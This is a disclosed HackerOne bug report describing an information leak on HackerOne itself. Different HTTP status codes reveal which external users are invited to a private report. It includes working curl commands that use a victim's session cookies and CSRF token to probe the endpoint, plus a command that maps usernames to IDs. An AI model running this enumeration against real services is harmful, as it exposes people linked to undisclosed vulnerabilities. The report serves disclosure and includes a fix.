# Disclosure of external users invited to a specific report

## Report Details
- **Report ID**: 157699
- **URL**: https://hackerone.com/reports/157699
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-08T19:39:31.359Z
- **Disclosed**: 2016-09-01T07:21:43.727Z

## Reporter
- **Username**: kirils
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
It is possible to verify whether a specific user is invited to participate _as an external user_ to a specific report.
Thus it is possible to enumerate all external users added to a specific (non-public) report of interest.

**PoC:**
```curl 'https://hackerone.com/reports/(**report_id**)/external_users/(**user_id**)' -X DELETE -H 'User-Agent: Mozilla/5.0' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'X-CSRF-Token: (**session**)' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: (**session**)' -D-```

```session``` parameters must be copied from a recent request in legitimate user's session.

Different HTTP status codes will be returned depending on whether the user is participating as an external user for a specific report:
 - HTTP/1.1 404 Not Found => **yes**
 - HTTP/1.1 500 Internal Server Error => **no**
 - (HTTP/1.1 412 Precondition Failed means you provided invalid session parameters)


```user_id``` can either be enumerated from 1000 up, or for a more realistic scenario, user ID can be gathered from https://hackerone.com/leaderboard/all-time or https://hackerone.com/hacktivity/new.
ID of a specific username can of course be pulled by any visitor even without authentication: ```curl 'https://hackerone.com/(**username**)' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'X-Requested-With: XMLHttpRequest'``` 

**Impact:**
This vulnerability may prove critical for non-resolved reports. This basically provides an attacker a list of researchers who know about an existing 0day and are not getting paid.

Unfortunately more and more of the researchers on h1 are proving to be greedy (see #154096 et al.) or at least "in-for-the-money". These people could easily succumb to a black market offer from the attacker and you've just given him the list of researchers to contact.

**Suggested fix:**
Check access rights to the report_id first and make sure to return the same status code and content in both cases. For extra measure make sure to drop out of execution flow at a single location to curb timing side channel attacks.

## Attachments
No attachments
